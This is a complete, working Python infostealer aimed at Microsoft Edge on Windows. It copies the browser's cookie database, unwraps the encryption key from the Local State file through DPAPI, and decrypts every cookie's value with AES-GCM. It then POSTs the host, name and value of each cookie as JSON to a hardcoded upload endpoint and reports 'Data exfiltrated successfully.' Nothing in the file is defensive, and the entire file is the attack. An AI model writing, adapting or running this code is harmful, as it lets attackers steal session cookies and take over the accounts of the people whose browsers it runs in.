import os
import sqlite3
import json
import base64
import shutil
import requests
from Crypto.Cipher import AES
import win32crypt

# Function to get Edge cookies
def get_edge_cookies():
    path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
    temp_path = os.path.expanduser('~') + r"\AppData\Local\Temp\Cookies"
    shutil.copyfile(path, temp_path)
    
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    cookies = []
    for host_key, name, encrypted_value in cursor.fetchall():
        decrypted_value = decrypt_edge_data(encrypted_value)
        cookies.append({
            "host": host_key,
            "name": name,
            "value": decrypted_value
        })
    
    conn.close()
    os.remove(temp_path)
    return cookies

# Function to decrypt Edge data
def decrypt_edge_data(encrypted_value):
    try:
        key = get_encryption_key()
        iv = encrypted_value[3:15]
        encrypted_value = encrypted_value[15:]
        
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()
        return decrypted_value
    except Exception as e:
        return ""

# Function to get the encryption key
def get_encryption_key():
    local_state_path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Local State"
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Function to send data to a remote server
def send_data(data):
    url = "http://192.168.0.1/upload"  # Unrouteable IP address
    headers = {'Content-Type': 'application/json'}
    try:
        response = requests.post(url, data=json.dumps(data), headers=headers)
        return response.status_code
    except requests.exceptions.RequestException as e:
        print(f"Failed to send data: {e}")
        return None

# Main function
if __name__ == "__main__":
    cookies = get_edge_cookies()
    status_code = send_data(cookies)
    if status_code == 200:
        print("Data exfiltrated successfully.")
    else:
        print("Failed to exfiltrate data.")
